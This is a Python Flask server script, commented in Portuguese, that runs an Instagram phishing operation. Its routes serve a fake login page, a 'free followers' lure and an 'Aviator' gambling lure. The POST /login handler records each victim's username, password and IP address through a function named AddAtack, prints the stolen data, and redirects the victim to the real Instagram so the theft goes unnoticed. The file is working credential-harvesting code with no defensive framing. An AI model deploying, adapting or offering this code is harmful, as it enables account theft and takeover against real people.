from flask import Flask, render_template, request, redirect
from datetime import datetime
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
from controls import *
import subprocess


# Importar logging aqui dentro da função para garantir que só seja importado quando necessário
import logging


app = Flask(__name__)

# Desativar os logs de werkzeug
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.before_request
def log_request_info():
    pass

@app.route('/', methods=["GET"])
def home():
    return render_template("folo.html")

@app.route('/ganha-no-aviator', methods=["GET"])
def aviator():
    return render_template("aviator.html")

@app.route('/login', methods=["GET"])
def login():
    return render_template("mobile.html")

@app.route('/instagram/followers', methods=["GET"])
def inst():
    return render_template("login.html")

@app.route('/login', methods=["POST"])
def receber():
    if request.headers.getlist("X-Forwarded-For"):
        user_ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        user_ip = request.remote_addr
    dados={
    "tipo":"Instagram",
    "ip":user_ip,
    "latitude":"-------------------",
    "longitude":"------------------",
    "username":request.form.get("username"),
    "password":request.form.get("password"),
    "datetime":datetime.now()
}
    print("---------------------------------------------Alguem Fez um Post------------------------------------------------")
    AddAtack(dados)
    printAllAtack()
    
    return redirect("https://instagram.com")

        

if __name__=="__main__":
    try:
        # Códigos de escape ANSI para cores
        GREEN = "\033[32m"
        YELLOW = "\033[33m"
        RESET = "\033[0m"

        # Impressão das rotas com cores diferentes
        print(f"{GREEN}Rotas para este servidor:{RESET} \n{YELLOW}/login \n/instagram/followers\n/ganha-no-aviator{RESET}")

        app.run(debug=True)
    except KeyboardInterrupt:
        print('\nFlask foi encerrado manualmente pelo usuário.')
        subprocess.run(['python', 'ghostermz.py'], check=True)
        sys.exit(1)  # Encerra o programa com código de erro 1

    except Exception as e:
        print(f'\nOcorreu um erro inesperado: {str(e)}')
        subprocess.run(['python', 'ghostermz.py'], check=True)
        sys.exit(1)  # Encerra o programa com código de erro 1

    